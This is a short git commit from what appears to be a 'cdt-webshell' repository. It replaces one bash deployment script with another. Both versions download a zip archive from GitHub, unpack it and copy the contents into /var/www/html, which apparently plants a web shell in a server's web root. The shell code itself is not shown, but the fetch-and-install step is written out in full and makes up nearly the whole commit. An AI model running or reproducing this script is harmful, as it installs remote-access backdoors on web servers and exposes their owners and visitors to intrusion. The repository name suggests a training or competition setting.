8ed95c81e2751c8de2d3eeaeb8ef5bb1133cfe51
Tyler Warren <tyler@thewalloffire.tech>
2020-02-26 21:04:43 -0800

    updated script and archive

--- hacked/test.sh
+++
@@ -1,4 +0,0 @@
-#!/bin/bash
-wget https://github.com/Tyfighter98/cdt-webshell/raw/master/hacked.zip
-unzip hacked.zip
-cp -r ./hacked/* /var/www/html
---
+++ test.sh
@@ -0,0 +1,4 @@
+#!/bin/bash
+wget https://github.com/Tyfighter98/cdt-webshell/raw/master/Archive.zip
+unzip Archive.zip
+cp -r ./Archive/* /var/www/html
